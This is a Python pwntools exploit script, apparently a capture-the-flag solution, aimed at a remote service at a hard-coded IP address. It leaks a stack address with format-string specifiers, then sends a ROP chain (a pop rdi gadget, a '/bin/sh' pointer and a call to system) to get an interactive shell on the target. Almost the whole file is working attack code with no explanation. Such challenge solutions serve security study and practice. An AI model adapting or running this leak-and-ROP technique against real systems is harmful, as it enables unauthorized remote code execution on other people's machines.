#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./secret"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 6131)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    b *0x400876
    '''

    gdb.attach(c, gdbcmd)
    #context.log_level ='debug'


# leak
for i in range(0):
    c.sendlineafter("key :",flat({0: '%{}$p'.format(i)}, length=0x10))
    c.recvuntil('key is ')
    print(i, c.recvline())
    c.sendlineafter("N)", 'N')

"""
c.sendlineafter("key :", '%12$p')
c.recvuntil('key is ')
rbp = int(c.recvline()[:-1] , 16)# - 0xe8
c.sendlineafter("N)", 'N')
"""

c.sendlineafter("key :", '%15$p')
c.recvuntil('key is ')
aarbp = int(c.recvline()[:-1] , 16) - 0xe8
c.sendlineafter("N)", 'N')


bin_sh = aarbp - 0x28 + 8 + 0x100
rop = b''
rop += p64(0x00000000004008e3) # 0x00000000004008e3 : pop rdi ; ret
rop += p64(bin_sh)
# rop += p64(0x400777)
rop += p64(0x400860) # call system
#rop += p64(elf.plt['puts']) # call system



c.sendlineafter("key :", flat({0x20: p64(aarbp) + rop, 0x100: '/bin/sh'}, filler = '\0', length = 0x120))
c.sendlineafter("N)", 'Y')

# main p64(0x400777)

c.interactive()
c.close()
